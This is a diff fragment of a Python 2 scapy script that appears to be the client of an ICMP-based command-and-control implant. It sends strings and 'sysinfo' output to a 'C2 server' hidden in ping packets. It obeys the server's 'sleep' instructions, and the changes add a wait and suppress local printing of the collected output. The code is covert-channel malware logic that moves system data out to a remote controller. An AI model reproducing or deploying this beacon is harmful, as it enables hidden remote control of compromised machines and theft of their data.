@@ -20,8 +20,12 @@ def sendPingRequest(command):
 	packet=IP(dst=sys.argv[1])/ICMP()/command
         #packet.show()
         p=sr1(packet,timeout=5)
-        print "[*] String sent to C2 server: " + command
-	return p
+        #p.show()
+	print "[*] String sent to C2 server: " + command
+	if p:
+		return p
+	else:
+		return
 
 def processReply(p):
 	try:
@@ -46,11 +50,12 @@ def processReply(p):
                 p=sendPingRequest('sysinfo %s' % output)
 		if p:	
 			processReply(p)
-		print output
+		#print output
                 print errors
-	elif 'thanks' in response:
-		print "[*] Request received"
+	elif 'Thanks' in response:
+		print "[*] Thanks received"
 		print "[*] Sleeping for 10"
+		time.sleep(10)
         elif 'sleep' in response:
 		seconds = response[6:]
                 print "[*] Master says sleep for %s seconds" % (seconds)
